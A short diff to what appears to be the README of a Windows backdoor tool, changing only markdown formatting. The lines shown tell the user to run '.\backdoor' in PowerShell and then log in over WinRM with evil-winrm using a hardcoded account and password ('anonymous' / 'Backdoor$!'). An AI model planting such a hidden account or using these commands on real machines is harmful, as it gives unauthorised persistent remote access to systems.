@@ -6,12 +6,10 @@
 
 <h1>USAGE:</h1>
 <br>
-```
-powershell
 
-.\backdoor```
+`.\backdoor`
+
 <br>
 <h1>LOGIN</h1>
-```
-evil-winrm -i IP -u anonymous -p 'Backdoor$!'
-```
+
+`evil-winrm -i IP -u anonymous -p 'Backdoor$!'`
